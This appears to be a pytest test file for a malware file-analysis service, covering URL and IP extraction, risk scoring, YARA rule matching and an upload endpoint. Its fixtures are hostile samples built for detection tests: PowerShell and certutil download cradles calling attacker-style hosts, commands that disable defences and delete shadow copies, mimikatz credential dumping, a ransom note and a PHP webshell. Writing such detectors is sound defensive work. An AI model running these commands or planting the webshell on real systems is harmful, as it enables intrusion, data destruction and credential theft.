import io

from fastapi.testclient import TestClient

from app.main import app
from app.modules.file_analysis.analyzers.network_indicators import extract_network_indicators
from app.modules.file_analysis.analyzers.risk import assess, find_suspicious_strings
from app.modules.file_analysis.analyzers.yara import scan_with_yara, yara_available
from app.modules.file_analysis.service import file_analysis_service

client = TestClient(app)

EICAR = rb"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
DOWNLOAD_CRADLE = (
    b'powershell -WindowStyle Hidden -enc AAAA; '
    b'IEX (New-Object Net.WebClient).DownloadString("http://malicious.example.com/a.ps1"); '
    b'cmd.exe /c certutil -urlcache -f http://185.220.101.1/b.exe b.exe & '
    b'schtasks /create /tn persist /tr b.exe'
)


def _headers(email: str = "analyst@local") -> dict[str, str]:
    token = client.post("/api/v1/auth/login", json={"email": email, "password": "x"}).json()[
        "access_token"
    ]
    return {"Authorization": f"Bearer {token}"}


# --- network indicators -------------------------------------------------------

def test_network_indicators_extracts_urls_and_public_ips():
    data = b"connect to http://evil.example.com/x and 8.8.8.8 but not 192.168.1.1 or 127.0.0.1"
    result = extract_network_indicators(data)
    assert "http://evil.example.com/x" in result["urls"]
    assert "8.8.8.8" in result["ips"]
    assert "192.168.1.1" not in result["ips"]
    assert "127.0.0.1" not in result["ips"]


# --- suspicious strings / risk ----------------------------------------------

def test_find_suspicious_strings():
    labels = find_suspicious_strings(DOWNLOAD_CRADLE)
    assert "PowerShell execution" in labels


def test_benign_text_scores_low():
    out = assess(
        data=b"hello world, this is a normal document about cats",
        metadata={"extension_matches_content": True, "likely_packed": False},
        yara_matches=[],
        signature_match={"matched": False},
        network={"urls": [], "ips": [], "domains": []},
    )
    assert out["risk"]["level"] == "low"
    assert out["risk"]["classification"] == "Likely Benign"


def test_signature_hit_drives_high_risk():
    out = assess(
        data=b"x",
        metadata={"extension_matches_content": True, "likely_packed": False},
        yara_matches=[],
        signature_match={"matched": True, "name": "ThreatLens.Demo.Trojan", "type": "Trojan", "severity": "high"},
        network={"urls": [], "ips": [], "domains": []},
    )
    assert out["risk"]["level"] == "high"
    assert "Trojan" in out["risk"]["classification"]


# --- yara -------------------------------------------------------------------

def test_yara_matches_eicar_when_available():
    if not yara_available():
        return  # environment without yara-python; analyzer degrades gracefully
    matches = scan_with_yara(EICAR)
    assert any(m["rule"] == "EICAR_Test_File" for m in matches)


def test_yara_detects_multiple_techniques_in_dropper():
    if not yara_available():
        return
    dropper = (
        b"powershell -nop -w hidden -ep bypass -enc AAAA\n"
        b"IEX (New-Object Net.WebClient).DownloadString('http://45.147.230.112/a.ps1')\n"
        b"(New-Object Net.WebClient).DownloadFile('http://45.147.230.112/b','x')\n"
        b"certutil -urlcache -split -f http://45.147.230.112/c c\n"
        b"bitsadmin /transfer j http://45.147.230.112/d d\n"
        b"Set-MpPreference -DisableRealtimeMonitoring $true\n"
        b"netsh advfirewall set allprofiles state off\n"
        b"AmsiScanBuffer amsiInitFailed AmsiUtils\n"
        b"vssadmin delete shadows /all /quiet\nwmic shadowcopy delete\n"
        b"reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v x /d y /f\n"
        b"schtasks /create /sc onlogon /tn t /tr y\n"
        b"VirtualAllocEx WriteProcessMemory CreateRemoteThread NtUnmapViewOfSection\n"
        b"sekurlsa::logonpasswords lsass.exe \\Login Data\n"
    )
    rules = {m["rule"] for m in scan_with_yara(dropper)}
    for expected in {
        "PowerShell_Download_Cradle",
        "LOLBin_Ingress_Tool_Transfer",
        "Defense_Evasion_Disable_Security_Tools",
        "AMSI_Bypass_Indicators",
        "ShadowCopy_Deletion",
        "Credential_Access_Tooling",
    }:
        assert expected in rules, f"{expected} not matched ({rules})"


def test_yara_detects_ransom_note_and_webshell():
    if not yara_available():
        return
    ransom = (
        b"All your files have been encrypted. To get the decryption key send "
        b"bitcoin to our .onion site. Files renamed to .locked"
    )
    php = b"<?php eval(base64_decode($_REQUEST['c'])); system($_GET['cmd']); ?>"
    assert any(m["rule"] == "Ransomware_Note_Or_Behavior" for m in scan_with_yara(ransom))
    assert any(m["rule"] == "WebShell_Indicators" for m in scan_with_yara(php))


def test_high_severity_yara_floors_the_score():
    php = b"<?php eval(base64_decode($_REQUEST['c'])); ?>"
    result = file_analysis_service.analyze_static_file("x.php", php)
    assert result.risk.level == "high"  # confirmed webshell, even with no other signal


# --- full pipeline + endpoint ---------------------------------------------

def test_pipeline_flags_download_cradle():
    result = file_analysis_service.analyze_static_file("cradle.ps1", DOWNLOAD_CRADLE)
    assert result.risk.level == "high"
    assert result.network_indicators.urls
    assert result.suspicious_indicators


def test_upload_endpoint_runs_full_analysis():
    resp = client.post(
        "/api/v1/files/upload",
        files={"file": ("invoice.exe", io.BytesIO(DOWNLOAD_CRADLE), "application/octet-stream")},
        headers=_headers(),
    )
    assert resp.status_code == 201
    body = resp.json()
    assert body["risk"]["score"] > 0
    assert body["hashes"]["sha256"]
    assert body["metadata"]["extension_matches_content"] is False  # .exe but text content


def test_upload_endpoint_requires_role():
    resp = client.post(
        "/api/v1/files/upload",
        files={"file": ("x.txt", io.BytesIO(b"hi"), "text/plain")},
        headers=_headers("soc@local"),
    )
    assert resp.status_code == 403


def test_upload_rejects_empty_file():
    resp = client.post(
        "/api/v1/files/upload",
        files={"file": ("x.txt", io.BytesIO(b""), "text/plain")},
        headers=_headers(),
    )
    assert resp.status_code == 400
